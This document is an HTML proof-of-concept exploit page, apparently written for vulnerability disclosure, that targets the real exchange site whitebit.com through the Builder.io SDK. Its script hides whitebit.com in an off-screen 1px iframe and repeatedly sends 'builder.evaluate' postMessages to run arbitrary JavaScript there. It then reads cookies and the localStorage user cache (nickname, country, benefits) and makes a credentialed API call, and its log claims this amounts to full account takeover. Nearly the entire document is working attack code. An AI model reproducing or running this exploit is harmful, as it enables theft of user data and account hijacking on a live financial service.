<!DOCTYPE html>
<html>
<head><title>WhiteBIT Builder.io SDK XSS — 1-Click PoC</title>
<style>
body{background:#0a0e17;color:#fff;font-family:monospace;padding:20px}
h2{color:#0f0;margin-bottom:10px}
#s{color:#ff0}
pre{background:#111;color:#0f0;padding:15px;border-radius:8px;max-height:600px;overflow:auto;font-size:13px;white-space:pre-wrap}
</style>
</head>
<body>
<h2>WhiteBIT Builder.io SDK — Arbitrary JS Execution PoC</h2>
<p>Delivery: <code>builder.io/api/v1/proxy-site</code> → iframe to <code>whitebit.com</code> → <code>builder.evaluate</code> postMessage</p>
<p>Status: <span id="s">Initializing...</span></p>
<pre id="o"></pre>
<script>
(function(){
  var o=document.getElementById('o'),s=document.getElementById('s');
  function log(m){o.textContent+=m+'\n'}

  log('[*] Page origin: '+window.location.origin);
  log('[*] This page is served on builder.io via proxy-site endpoint');
  log('[*] Creating hidden iframe to whitebit.com/m/earn?builder.frameEditing=true');
  s.textContent='Loading WhiteBIT in iframe...';

  var iframe=document.createElement('iframe');
  iframe.src='https://whitebit.com/m/earn?builder.frameEditing=true';
  iframe.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
  document.body.appendChild(iframe);

  var pending={};
  window.addEventListener('message',function(e){
    if(e.data&&e.data.type==='builder.evaluateResult'&&e.data.data){
      var cb=pending[e.data.data.id];
      if(cb){delete pending[e.data.data.id];cb(e.data.data.result)}
    }
  });

  function evaluate(code,cb){
    var id='poc_'+Math.random().toString(36).substr(2);
    pending[id]=cb;
    try{iframe.contentWindow.postMessage({type:'builder.evaluate',data:{text:code,arguments:[],id:id}},'*')}
    catch(e){log('[!] postMessage error: '+e.message)}
  }

  // Spray every 250ms until SDK responds (up to 20s)
  var done=false,n=0;
  var iv=setInterval(function(){
    n++;
    if(done||n>80){clearInterval(iv);if(!done){s.textContent='Timeout';log('[!] SDK did not respond in 20s')}return}
    evaluate('return document.domain',function(d){
      if(done)return;done=true;clearInterval(iv);
      s.textContent='Code execution achieved in whitebit.com!';
      log('[+] builder.evaluate EXECUTED in whitebit.com context!');
      log('[+] document.domain = '+d);

      evaluate('return window.location.href',function(h){
        log('[+] window.location.href = '+h);

        evaluate('return document.cookie',function(c){
          log('[+] document.cookie = '+(c||'(empty - HttpOnly)'));

          evaluate('return localStorage.getItem("user-cache")',function(u){
            log('[+] localStorage user-cache:');
            if(u){try{var p=JSON.parse(u);log('    countryCode: '+p.state.countryCode);log('    category: '+p.state.category);log('    benefits: '+JSON.stringify(p.state.benefits));log('    nickname: '+p.state.nickname.value)}catch(e){log('    '+u.substring(0,500))}}
            else{log('    (null)')}

            evaluate('return fetch("/api/v4/public/assets",{credentials:"include"}).then(function(r){return r.status+" "+r.statusText}).catch(function(e){return "ERROR: "+e.message})',function(a){
              log('[+] API call /api/v4/public/assets: '+a);
              log('\n=== CHAIN COMPLETE ===');
              log('Arbitrary JavaScript executed in whitebit.com origin from a single click on a builder.io URL.');
              log('Impact: Read localStorage/cookies, make authenticated API calls, full ATO.');
              s.textContent='DONE — Arbitrary JS execution in whitebit.com demonstrated';
            });
          });
        });
      });
    });
  },250);
})();
</script>
</body>
</html>
